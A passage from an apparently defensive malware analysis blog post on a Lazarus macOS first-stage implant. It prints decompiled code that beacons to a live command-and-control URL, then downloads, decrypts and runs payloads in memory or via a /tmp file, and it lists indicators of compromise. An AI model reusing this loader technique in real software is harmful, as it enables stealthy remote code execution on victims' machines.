</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    r15 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(int32_t <span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>_kIOMasterPortDefault;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    rax <span style="color:#f92672">=</span> IOServiceMatching(<span style="color:#e6db74">&#34;IOPlatformExpertDevice&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    rax <span style="color:#f92672">=</span> IOServiceGetMatchingService(r15, rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>            rbx <span style="color:#f92672">=</span> CFStringGetCString(IORegistryEntryCreateCFProperty(rax, 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>            <span style="color:#e6db74">@&#34;IOPlatformSerialNumber&#34;</span>, <span style="color:#f92672">**</span>_kCFAllocatorDefault, <span style="color:#ae81ff">0x0</span>), 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>            r14, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x8000100</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0x1</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>            
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>            IOObjectRelease(rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    rax <span style="color:#f92672">=</span> rbx;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    <span style="color:#66d9ef">return</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>}</span></span></code></pre></div>
Debugging the malware (in a VM), shows this method correctly returns the virtual machine&rsquo;s serial number (<code>VM+nL/ueNmNG</code>):<br>
<br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) x/s $rax
0x7ffeefbff810: "VM+nL/ueNmNG"
</pre>
</div>
\</p>
</li>
<li>
<p>Invokes a function named <code>getOSVersion</code> in order to retrieve the OS version, by reading the system file, <code>/System/Library/CoreServices/SystemVersion.plist</code> (which contains various version-related information):
<br>
<br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ defaults read /System/Library/CoreServices/SystemVersion.plist
{
    ProductBuildVersion = 18F132;
    ProductCopyright = "1983-2019 Apple Inc.";
    ProductName = "Mac OS X";
    ProductUserVisibleVersion = "10.14.5";
    ProductVersion = "10.14.5";
    iOSSupportVersion = "12.3";
}
</pre>
</div>
<br>
Again in the debugger, we can observe the malware retrieving this information (specifically the <code>ProductName</code>, <code>ProductUserVisibleVersion</code>, and <code>ProductBuildVersion</code>):
<br>
<br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) x/s 0x7ffeefbff790
0x7ffeefbff790: "Mac OS X 10.14.5 (18F132)"
</pre>
</div></p>
</li>
<li>
<p>Builds a string consisting of the time and hardcode value (key?): <code>12GWAPCT1F0I1S14</code>
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objc" data-lang="objc"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>sprintf(<span style="color:#f92672">&amp;</span>var_130, <span style="color:#e6db74">&#34;%ld&#34;</span>, time(<span style="color:#ae81ff">0x0</span>));
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>rax <span style="color:#f92672">=</span> sprintf(<span style="color:#f92672">&amp;</span>var_1B0, <span style="color:#e6db74">&#34;%s%s&#34;</span>, <span style="color:#f92672">&amp;</span>var_130, <span style="color:#e6db74">&#34;12GWAPCT1F0I1S14&#34;</span>);</span></span></code></pre></div></p>
</li>
<li>
<p>Invokes the <code>Barbeque::post()</code> method to contact a remote command &amp; control server (<code>https://unioncrypto.vip/update</code>):
The network logic leverages via <code>libcurl</code> to perform the actual communications:
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>curl_easy_setopt(<span style="color:#f92672">*</span>r15, <span style="color:#ae81ff">0x2727</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>curl_easy_setopt(<span style="color:#f92672">*</span>r15, <span style="color:#ae81ff">0x4e2b</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>curl_easy_setopt(<span style="color:#f92672">*</span>r15, <span style="color:#ae81ff">0x2711</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>rdi <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>r15;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>curl_easy_setopt(rdi, <span style="color:#ae81ff">0x271f</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>rax <span style="color:#f92672">=</span> curl_easy_perform(<span style="color:#f92672">*</span>r15);</span></span></code></pre></div>
Our firewall <a href="https://objective-see.com/products/lulu.html">LuLu</a> easily detects this connection attempt:
<br>
<br>
<img src="../images/blog/blog_0x51/lulu.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
</li>
<li>
<p>If the server responds with the string <code>&quot;0&quot;</code> the malware will sleep for 10 minutes, before checking in again with the server:
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> (std<span style="color:#f92672">::</span>__1<span style="color:#f92672">::</span>basic_string ... <span style="color:#f92672">::</span>compare(rbx, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0xffffffffffffffff</span>, <span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>{ 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>  sleep(<span style="color:#ae81ff">0x258</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>  <span style="color:#66d9ef">goto</span> connect2Server;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>}</span></span></code></pre></div>
Otherwise it will invoke a function to base64 decode the server&rsquo;s respond, followed by a function named <code>processUpdate</code> to execute a downloaded payload from the server.</p>
</li>
</ol>
<p>Ok, so we&rsquo;ve got a fairly standard persistent 1<sup>st</sup>-stage implant which beacons to a remote server for (likely) a 2<sup>nd</sup>-stage fully-featured implant.</p>
<div class="note">
<p>At this time, while the remote command &amp; control server remains online, it simply it responding with a &ldquo;0&rdquo;, meaning no payload is provided :(
\</p>
<p>As such, we must rely on static analysis methods for the remainder of our analysis.</p>
</div>
<p>However, the is one rather unique aspect of this 1<sup>st</sup>-stage implant: the ability to execute the received payload, directly from memory!</p>
<p>Looks take a closer look at how the malware implements this stealthy capability.</p>
<p>Recall that if the server responds with payload (and not a string <code>&quot;0&quot;</code>), the malware invokes the <code>processUpdate</code> function. First the <code>processUpdate</code> decrypts said payload (via <code>aes_decrypt_cbc</code>), then invokes a function named <code>load_from_memory</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>aes_decrypt_cbc(<span style="color:#ae81ff">0x0</span>, r15, rdx, rcx, <span style="color:#f92672">&amp;</span>var_40);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>memcpy(<span style="color:#f92672">&amp;</span>var_C0, r15, <span style="color:#ae81ff">0x80</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>rbx <span style="color:#f92672">=</span> rbx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x90</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>r14 <span style="color:#f92672">=</span> r14 <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x90</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>rax <span style="color:#f92672">=</span> _load_from_memory(rbx, r14, <span style="color:#f92672">&amp;</span>var_C0, rcx, <span style="color:#f92672">&amp;</span>var_40, r9);</span></span></code></pre></div>
<p>The <code>load_from_memory</code> function first mmaps some memory (with protections: PROT_READ | PROT_WRITE | PROT_EXEC). Then copies the decrypted payload into this memory region, before invoking a function named <code>memory_exec2</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">_load_from_memory</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">int</span> arg2, <span style="color:#66d9ef">int</span> arg3, <span style="color:#66d9ef">int</span> arg4, <span style="color:#66d9ef">int</span> arg5) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    r14 <span style="color:#f92672">=</span> arg2;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    r12 <span style="color:#f92672">=</span> arg1;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    r15 <span style="color:#f92672">=</span> arg0;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    rax <span style="color:#f92672">=</span> mmap(<span style="color:#ae81ff">0x0</span>, arg1, <span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0x1001</span>, <span style="color:#ae81ff">0xffffffffffffffff</span>, <span style="color:#ae81ff">0x0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>            memcpy(rax, r15, r12);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>            r14 <span style="color:#f92672">=</span> _memory_exec2(rax, r12, r14);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>            munmap(rax, r12);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>            rax <span style="color:#f92672">=</span> r14;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>            rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    <span style="color:#66d9ef">return</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>}</span></span></code></pre></div>
<p>The <code>memory_exec2</code> function invokes the Apple API <code>NSCreateObjectFileImageFromMemory</code> to create an &ldquo;object file image&rdquo; from a memory buffer (of a mach-O file). Following this, the <code>NSLinkModule</code> method is called to link the &ldquo;object file image&rdquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">_memory_exec2</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">int</span> arg2) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    rax <span style="color:#f92672">=</span> NSCreateObjectFileImageFromMemory(rdi, rsi, <span style="color:#f92672">&amp;</span>var_58);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    rax <span style="color:#f92672">=</span> NSLinkModule(var_58, <span style="color:#e6db74">&#34;core&#34;</span>, <span style="color:#ae81ff">0x3</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    
</span></span></code></pre></div>
<div class="note">
<p>As the layout of an in-memory process image is different from its on disk-in image, one cannot simply copy a file into memory and directly execute it.
Instead, one must invoke APIs such as NSCreateObjectFileImageFromMemory and NSLinkModule (which take care of preparing the in-memory mapping and linking).</p>
</div>
<p>Once the malware has mapped and linked the downloaded payload, it invokes a function named <code>find_macho</code> which appears to search the memory mapping for <code>MH_MAGIC_64</code>, the 64-bit &ldquo;mach magic number&rdquo; in the <code>mach_header_64</code> structure (<code>0xfeedfacf</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">find_macho</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">int</span> arg2, <span style="color:#66d9ef">int</span> arg3) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)__error() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)rbx <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xfeedfacf</span>)) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  } <span style="color:#66d9ef">while</span> (true);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>}</span></span></code></pre></div>
<p>Once the <code>find_macho</code> method returns, the malware begins parsing the in-memory mach-O file. It appears to be looking for the address of <code>LC_MAIN</code> load command (<code>0x80000028</code>):
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)rcx <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x80000028</span>) <span style="color:#66d9ef">goto</span> loc_100006ac7;</span></span></code></pre></div></p>
<div class="note">
<p>For an in-depth technical discussion of parsing mach-O files, see: <a href="https://lowlevelbits.org/parsing-mach-o-files/">&ldquo;Parsing Mach-O Files&rdquo;</a>.</p>
</div>
<p>The <code>LC_MAIN</code> load command contains information such as the entry point of the mach-O binary (for example, offset <code>18177</code> for the <code>unioncryptoupdater</code> binary):
<br>
<br>
<img src="../images/blog/blog_0x51/machoView.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>The malware then retrieves the offset of the entry point (found at offset <code>0x8</code> within the <code>LC_MAIN</code> load command), sets up some arguments, then jumps to this address:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">//rcx points to the `LC_MAIN` load command
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e"></span>r8 <span style="color:#f92672">=</span> r8 <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>(rcx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#75715e">//invoke payload&#39;s entry point!
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span><span style="color:#75715e"></span>rax <span style="color:#f92672">=</span> (r8)(<span style="color:#ae81ff">0x2</span>, <span style="color:#f92672">&amp;</span>var_40, <span style="color:#f92672">&amp;</span>var_48, <span style="color:#f92672">&amp;</span>var_50, r8);</span></span></code></pre></div></p>
<p>Delightful! Pure in-memory execution of a remotely downloaded payload. 🤩 Sexy!</p>
<p>In 2015, at BlackHat I discussed this method of in-memory file execution as a means to increase stealth and complicate forensics (See: <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf">&ldquo;Writing Bad @$$ Malware for OS X&rdquo;</a>):</p>
<img src="../images/blog/blog_0x51/presentation.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>&hellip;kinda neat to see it (finally) show up in macOS malware in the wild!</p>
<div class="note">
<p>For more details on in-memory code execution in macOS, see:</p>
<ul>
<li><a href="https://threatvector.cylance.com/en_us/home/running-executables-on-macos-from-memory.html">&ldquo;Running Executables on macOS From Memory&rdquo;</a></li>
<li>Apple&rsquo;s <a href="https://developer.apple.com/library/archive/samplecode/MemoryBasedBundle/Introduction/Intro.html#//apple_ref/doc/uid/DTS10003518">&ldquo;MemoryBasedBundle&rdquo;</a> sample code</li>
</ul>
</div>
<p><br>
\</p>
<div class="note">
<p>Former #OBTS speaker Felix Seele (<a href="https://twitter.com/c1truz_">@c1truz_</a>) noted that the (in)famous InstallCore adware also (ab)used the NSCreateObjectFileImageFromMemory and NSLinkModule APIs to achieve in-memory execution.</p>
</div>
<p>Interestingly, the malware has a &ldquo;backup&rdquo; plan if the in-memory code execution fails. Specifically if <code>load_from_memory</code> does not return 0 (success) it will write out the received payload to <code>/tmp/updater</code> and then execute it via a call to <code>system</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>rax <span style="color:#f92672">=</span> _load_from_memory(rbx, r14, <span style="color:#f92672">&amp;</span>var_C0, rcx, <span style="color:#f92672">&amp;</span>var_40, r9);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#66d9ef">if</span>(rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  fwrite(rbx, r14, <span style="color:#ae81ff">0x1</span>, fopen(<span style="color:#e6db74">&#34;/tmp/updater&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>));
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  fclose(rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>  chmod(<span style="color:#e6db74">&#34;/tmp/updater&#34;</span>, <span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>  sprintf(<span style="color:#f92672">&amp;</span>var_4C0, <span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;/tmp/updater&#34;</span>, <span style="color:#f92672">&amp;</span>var_C0);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  rax <span style="color:#f92672">=</span> system(<span style="color:#f92672">&amp;</span>var_4C0);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  unlink(<span style="color:#e6db74">&#34;/tmp/updater&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>}</span></span></code></pre></div>
<p>Always good to handle error conditions and have a plan B!</p>
<h3 id="conclusion">Conclusion</h3>
<p>Lazarus group continues to target macOS users with ever evolving capabilities. Today, we analyzed a new sample with the ability to remotely download and execute payloads directly from memory!</p>
<p>The good news is the average Mac user doesn&rsquo;t have to worry about being targeted by APT groups such as Lazarus. Moreover, as the installer package, <code>UnionCryptoTrader.pkg</code> is unsigned, macOS will warn any users if they attempt to open it:
<br>
<br>
<img src="../images/blog/blog_0x51/warning.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>However, if you do want to manually check if you&rsquo;re infected, the following IoCs should help:</p>
<ul>
<li>Launch Daemon property list: <code>/Library/LaunchDaemons/vip.unioncrypto.plist</code></li>
<li>Running process/binary: <code>/Library/UnionCrypto/unioncryptoupdater</code></li>
</ul>
